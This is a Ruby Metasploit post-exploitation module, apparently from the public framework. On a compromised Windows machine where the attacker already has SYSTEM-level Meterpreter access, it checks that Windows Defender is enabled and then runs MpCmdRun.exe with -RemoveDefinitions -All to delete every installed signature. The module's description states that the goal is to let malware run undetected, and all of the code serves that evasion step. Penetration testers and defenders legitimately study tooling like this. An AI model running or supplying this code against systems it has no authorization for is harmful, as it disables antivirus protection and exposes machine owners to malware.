##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Disable Windows Defender Signatures',
      'Description'   => %q{
        This module with appropriate rights let to use the Windows Defender command-line utility a run and automation
        tool (mpcmdrun.exe) in order to disable all the signatures available installed for the compromised machine.
        The tool is prominently used for scheduling scans and updating the signature or definition files,
        but there is a switch created to restore the installed signature definitions to a previous backup copy or
        to the original default set of signatures which is none, disabling all the signatures and allowing malware
        to execute even with the Windows Defender solution enabled.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['metasploit@[at]csiete.org',
      'luisco100 <luisco100[at]gmail.com>'], # Module author
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      ))
    register_options(
      [
        OptEnum.new('ACTION', [ true, 'Action to perform (Update/Rollback)', 'Rollback', ['rollback', 'update']])
      ])
  end

  def run
    #Are we system?
    if not is_system?()
      fail_with(Failure::NoAccess, "You must be System to run this Module")
    end
    #Is the binary there?
    program_path = session.sys.config.getenv('ProgramFiles')
    vprint_status("program_path = #{program_path}")
    file_path = program_path + '\Windows Defender\MpCmdRun.exe'
    vprint_status("file_path = #{file_path}")
    if not exist?(file_path)
      fail_with(Failure::NoAccess, "#{file_path} is not Present")
    end
    #Is defender even enabled?
    defender_disable_key = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
    disable_key_value = meterpreter_registry_getvalinfo(defender_disable_key, "DisableAntiSpyware", REGISTRY_VIEW_NATIVE)
    if disable_key_value.nil? || disable_key_value != 1
      print_status("Removing All Definitions for Windows Defender")
      print_status(datastore['ACTION'])
      if datastore['ACTION'].casecmp('Rollback') == 0
        cmd = "cmd.exe /c \"#{file_path}\" -RemoveDefinitions -All"
      else
        cmd = "cmd.exe /c \"#{file_path}\" -SignatureUpdate"
      end
      print_status("Running #{cmd}")
      output = cmd_exec(cmd)
      if output.include?('denied')
        print_bad("#{output}")
      else
        print_status("#{output}")
      end
    else
      fail_with(Failure::BadConfig, "Defender is not Enabled")
    end
  end
end
